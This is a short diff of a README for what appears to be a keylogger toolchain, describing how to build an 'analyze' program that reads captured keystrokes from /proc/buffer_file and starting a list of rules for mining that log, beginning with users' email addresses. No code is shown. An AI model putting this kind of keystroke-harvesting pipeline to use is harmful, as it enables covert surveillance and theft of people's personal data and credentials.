@@ -1,7 +1,8 @@
 # How to run
     In the current directory, run "make", and there should be a exec file calls "analyze".
     Run "./analyze" to get the output file.
-    The input file is currently "test.txt", the output file will be "output_data.txt", wrote down the information we want from the keylog.
+    The input file is currently "log_file.txt", the output file will be "log_file_analysed.txt", wrote down the information we want from the keylog.
+    "log_file.txt" is taken from /proc/buffer_file and "log_file_analysed.txt" will be fed as input into the python script.
 
 # Rules for analyzing data we got using keylogger
 ### 1. Check for user's email adresses:
